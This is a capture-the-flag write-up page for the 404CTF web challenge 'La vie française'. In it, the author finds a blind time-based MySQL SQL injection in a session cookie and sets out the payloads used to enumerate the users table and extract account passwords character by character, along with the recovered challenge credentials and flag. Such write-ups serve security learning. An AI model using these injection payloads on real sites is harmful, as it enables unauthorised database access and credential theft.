<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>404CTF : La vie française | Sanlokii</title>
<meta name=keywords content="Web,Write-up"><meta name=description content="Web - Easy"><meta name=author content><link rel=canonical href=https://sanlokii.eu/writeups/404ctf/la-vie-francaise/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://sanlokii.eu/assets/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sanlokii.eu/assets/images/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sanlokii.eu/assets/imagesfavicon-32x32.png><link rel=apple-touch-icon href=https://sanlokii.eu/assets/images/apple-touch-icon.png><link rel=mask-icon href=https://sanlokii.eu/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://sanlokii.eu/writeups/404ctf/la-vie-francaise/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="404CTF : La vie française"><meta property="og:description" content="Web - Easy"><meta property="og:type" content="article"><meta property="og:url" content="https://sanlokii.eu/writeups/404ctf/la-vie-francaise/"><meta property="og:image" content="https://sanlokii.eu/assets/images/yggdrasil_circle.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-06-05T00:00:00+00:00"><meta property="article:modified_time" content="2023-06-05T00:00:00+00:00"><meta property="og:site_name" content="Sanlokii's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://sanlokii.eu/assets/images/yggdrasil_circle.png"><meta name=twitter:title content="404CTF : La vie française"><meta name=twitter:description content="Web - Easy"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://sanlokii.eu/writeups/"},{"@type":"ListItem","position":2,"name":"404CTF : La vie française","item":"https://sanlokii.eu/writeups/404ctf/la-vie-francaise/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"404CTF : La vie française","name":"404CTF : La vie française","description":"Web - Easy","keywords":["Web","Write-up"],"articleBody":"Statement: Sitting in a corner of the coffee shop, Madelaine Forestier watches alone as customers bustle about. You can see her from your seat. She’s a dignified, intelligent and ambitious woman, as you can tell from her attitude. Mrs. Forestier is a widow, as one of your previous encounters at the counter told you. Charles Forestier, journalist with the famous La Vie Française, died recently. Health problems, it seems.\nYou see a man approach Mrs. Forestier.\nIt’s Georges Duroy, someone whispers in your ear, a friend of Forestier’s who hasn’t lost his touch! Ever since poor Charles died, Duroy has been trying to seduce Madelaine to get her shares in the newspaper back.\nYou don’t listen any longer. While Mrs. Forestier seems to be wearily refusing Mr. Duroy’s request, you notice that he is looking intently at the newspaper she has just finished reading. Duroy leaves in a hurry; he gives up far too quickly for this to be normal…\nYou retrieve Mrs. Forestier’s diary. Analyze it: if Georges Duroy left in such a hurry, he must have found a way to gain access to the shares he covets so much.\nGoing to the website, I notice that there are two interesting functions:\nlogin page registration page I’ll start by sending a few inputs to the login and authentication page to see how it behaves and I notice the following points :\nadmin account is disabled accepts only alphanumeric characters I therefore conclude that performing an SQLi with alphanumeric characters only seems impossible from these pages.\nI create an account on the authentication page to extend the attack surface.\nThe home page once authenticated is being renovated, so there’s not much more to come on this front.\nHowever, I notice that once authenticated, a cookie is created with the value : uuid:1882aca4fc5048069469b2ef35c59b5f\nI’m thinking that the vulnerability must have been exploited on this cookie, as there’s nothing else on the site that attracts my attention.\nSo I start by creating several accounts to detect a possible occurrence when generating the uuid, but it doesn’t work.\nI also try a bruteforce common hash MD5 but also inconclusive.\nI decide to try an SQLi operation on the cookie.\nAfter several attempts to detect the database engine, the following payload confirms that the site is vulnerable to SQLi blind time delay - MySQL :\nCookie: uuid='+sleep(5)--' I’m trying to see if I can make conditional time delays afterwards for exfiltrate data :\nCookie: uuid='+if(1=1,sleep(5),null)--' I then assume the existence of the users table and confirm its existence :\nCookie: uuid='+if(substring((select 1 from users limit 0,1),1,1)=1,sleep(5),null)--' After a few attempts, I discovered the existence of the following columns :\nid username password uuid Cookie: uuid='+if(substring((select substring(concat(1,column_name),1,1) from users limit 0,1),1,1)=1,sleep(5),null)--' Next, I’ll try to exfiltrate the password data of an account I’ve just created {username:x, password:x} :\nCookie: uuid='+if((select username from users where username = 'x' limit 0,1)='x',sleep(5),null)--' Now I need to retrieve the username:password pair of an admin account.\nI assume that id 1 in the database is potentially an admin account so I’ll exfil the username first.\nValues between §§ will be incremented with numbers for the first and alphanumeric characters for the second :\nCookie: uuid='+if((select substring(username,§1§,1) from users where id = 1 limit 0,1)='§a§',sleep(5),null)--' I do the same thing to recover the password :\nCookie: uuid='+if((select substring(password,§1§,1) from users where id = 1 limit 0,1)='§a§',sleep(5),null)--' I can now connect with credentials jacquesrival:jqwme96dzmewml but the recover account doesn’t have admin rights.\nI then decided to retrieve the first 5 chars of the user accounts to detect the presence of an admin account.\nFollowing enumeration, the username with id 6 in the database begins with madel like Madelaine Forestier in statement.\nIt is likely that his account has admin rights.\nI exfil again the data I’m interested in :\nusername Cookie: uuid='+if((select substring(username,§1§,1) from users where id = 6 limit 0,1)='§a§',sleep(5),null)--' password Cookie: uuid='+if((select substring(password,§1§,1) from users where id = 6 limit 0,1)='§a§',sleep(5),null)--' I now have access to Madelaine Forestier’s account with a typography on her first name : madeleineforestier:fo2dvkgshz2ppj\nFlag : 404CTF{B3w4Re_th3_d3STruct1v3s_Qu0tes}\n","wordCount":"681","inLanguage":"en","datePublished":"2023-06-05T00:00:00Z","dateModified":"2023-06-05T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://sanlokii.eu/writeups/404ctf/la-vie-francaise/"},"publisher":{"@type":"Organization","name":"Sanlokii","logo":{"@type":"ImageObject","url":"https://sanlokii.eu/assets/images/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://sanlokii.eu/ accesskey=h title="Sanlokii (Alt + H)"><img src=https://sanlokii.eu/assets/images/apple-touch-icon.png alt aria-label=logo height=40>Sanlokii</a><div class=logo-switches><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://sanlokii.eu/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://sanlokii.eu/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://sanlokii.eu/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sanlokii.eu/>Home</a>&nbsp;»&nbsp;<a href=https://sanlokii.eu/writeups/>Writeups</a></div><h1 class="post-title entry-hint-parent">404CTF : La vie française</h1><div class=post-description>Web - Easy</div><div class=post-meta><span title='2023-06-05 00:00:00 +0000 UTC'>June 5, 2023</span></div></header><div class=post-content><p><strong>Statement:</strong>
Sitting in a corner of the coffee shop, Madelaine Forestier watches alone as customers bustle about. You can see her from your seat. She&rsquo;s a dignified, intelligent and ambitious woman, as you can tell from her attitude. Mrs. Forestier is a widow, as one of your previous encounters at the counter told you. Charles Forestier, journalist with the famous La Vie Française, died recently. Health problems, it seems.</p><p>You see a man approach Mrs. Forestier.</p><p>It&rsquo;s Georges Duroy, someone whispers in your ear, a friend of Forestier&rsquo;s who hasn&rsquo;t lost his touch! Ever since poor Charles died, Duroy has been trying to seduce Madelaine to get her shares in the newspaper back.</p><p>You don&rsquo;t listen any longer. While Mrs. Forestier seems to be wearily refusing Mr. Duroy&rsquo;s request, you notice that he is looking intently at the newspaper she has just finished reading. Duroy leaves in a hurry; he gives up far too quickly for this to be normal&mldr;</p><p>You retrieve Mrs. Forestier&rsquo;s diary. Analyze it: if Georges Duroy left in such a hurry, he must have found a way to gain access to the shares he covets so much.</p><hr><p>Going to the website, I notice that there are two interesting functions:</p><ul><li>login page</li><li>registration page</li></ul><p>I&rsquo;ll start by sending a few inputs to the login and authentication page to see how it behaves and I notice the following points :</p><ul><li>admin account is disabled</li><li>accepts only alphanumeric characters</li></ul><p>I therefore conclude that performing an SQLi with alphanumeric characters only seems impossible from these pages.</p><p>I create an account on the authentication page to extend the attack surface.</p><p>The home page once authenticated is being renovated, so there&rsquo;s not much more to come on this front.</p><p>However, I notice that once authenticated, a cookie is created with the value : <code>uuid:1882aca4fc5048069469b2ef35c59b5f</code></p><p>I&rsquo;m thinking that the vulnerability must have been exploited on this cookie, as there&rsquo;s nothing else on the site that attracts my attention.</p><p>So I start by creating several accounts to detect a possible occurrence when generating the uuid, but it doesn&rsquo;t work.</p><p>I also try a bruteforce common hash MD5 but also inconclusive.</p><p>I decide to try an SQLi operation on the cookie.</p><p>After several attempts to detect the database engine, the following payload confirms that the site is vulnerable to SQLi blind time delay - MySQL :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Cookie: uuid=&#39;+sleep(5)--&#39;
</span></span></span></code></pre></div><p>I&rsquo;m trying to see if I can make conditional time delays afterwards for exfiltrate data :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Cookie: uuid=&#39;+if(1=1,sleep(5),null)--&#39;
</span></span></span></code></pre></div><p>I then assume the existence of the <strong>users</strong> table and confirm its existence :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Cookie: uuid=&#39;+if(substring((select 1 from users limit 0,1),1,1)=1,sleep(5),null)--&#39;
</span></span></span></code></pre></div><p>After a few attempts, I discovered the existence of the following columns :</p><ul><li>id</li><li>username</li><li>password</li><li>uuid</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Cookie: uuid=&#39;+if(substring((select substring(concat(1,column_name),1,1) from users limit 0,1),1,1)=1,sleep(5),null)--&#39;
</span></span></span></code></pre></div><p>Next, I&rsquo;ll try to exfiltrate the password data of an account I&rsquo;ve just created <strong>{username:x, password:x}</strong> :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Cookie: uuid=&#39;+if((select username from users where username = &#39;x&#39; limit 0,1)=&#39;x&#39;,sleep(5),null)--&#39;
</span></span></span></code></pre></div><p>Now I need to retrieve the <strong>username:password</strong> pair of an admin account.</p><p>I assume that id 1 in the database is potentially an admin account so I&rsquo;ll exfil the username first.</p><p>Values between §§ will be incremented with numbers for the first and alphanumeric characters for the second :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Cookie: uuid=&#39;+if((select substring(username,§1§,1) from users where id = 1 limit 0,1)=&#39;§a§&#39;,sleep(5),null)--&#39;
</span></span></span></code></pre></div><p><img loading=lazy src=/assets/images/writeups/404_laviefrancaise.png#center alt=laviefrancaise></p><p>I do the same thing to recover the password :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Cookie: uuid=&#39;+if((select substring(password,§1§,1) from users where id = 1 limit 0,1)=&#39;§a§&#39;,sleep(5),null)--&#39;
</span></span></span></code></pre></div><p><img loading=lazy src=/assets/images/writeups/404_laviefrancaise1.png#center alt=laviefrancaise1></p><p>I can now connect with credentials <code>jacquesrival:jqwme96dzmewml</code> but the recover account doesn&rsquo;t have admin rights.</p><p>I then decided to retrieve the first 5 chars of the user accounts to detect the presence of an admin account.</p><p>Following enumeration, the username with id 6 in the database begins with <strong>madel</strong> like Madelaine Forestier in statement.</p><p>It is likely that his account has admin rights.</p><p>I exfil again the data I&rsquo;m interested in :</p><ul><li>username</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Cookie: uuid=&#39;+if((select substring(username,§1§,1) from users where id = 6 limit 0,1)=&#39;§a§&#39;,sleep(5),null)--&#39;
</span></span></span></code></pre></div><ul><li>password</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Cookie: uuid=&#39;+if((select substring(password,§1§,1) from users where id = 6 limit 0,1)=&#39;§a§&#39;,sleep(5),null)--&#39;
</span></span></span></code></pre></div><p>I now have access to Madelaine Forestier&rsquo;s account with a typography on her first name : <code>madeleineforestier:fo2dvkgshz2ppj</code></p><p>Flag : <code>404CTF{B3w4Re_th3_d3STruct1v3s_Qu0tes}</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://sanlokii.eu/tags/web/>Web</a></li><li><a href=https://sanlokii.eu/tags/write-up/>Write-Up</a></li></ul><nav class=paginav><a class=prev href=https://sanlokii.eu/writeups/404ctf/academie-du-detail/><span class=title>« Prev</span><br><span>404CTF : L'académie du détail</span>
</a><a class=next href=https://sanlokii.eu/writeups/breizh-ctf/bonjour-ondine/><span class=title>Next »</span><br><span>BreizhCTF : Bonjour Ondine</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share 404CTF : La vie française on x" href="https://x.com/intent/tweet/?text=404CTF%20%3a%20La%20vie%20fran%c3%a7aise&amp;url=https%3a%2f%2fsanlokii.eu%2fwriteups%2f404ctf%2fla-vie-francaise%2f&amp;hashtags=Web%2cWrite-up"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 404CTF : La vie française on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsanlokii.eu%2fwriteups%2f404ctf%2fla-vie-francaise%2f&amp;title=404CTF%20%3a%20La%20vie%20fran%c3%a7aise&amp;summary=404CTF%20%3a%20La%20vie%20fran%c3%a7aise&amp;source=https%3a%2f%2fsanlokii.eu%2fwriteups%2f404ctf%2fla-vie-francaise%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://sanlokii.eu/>Sanlokii</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>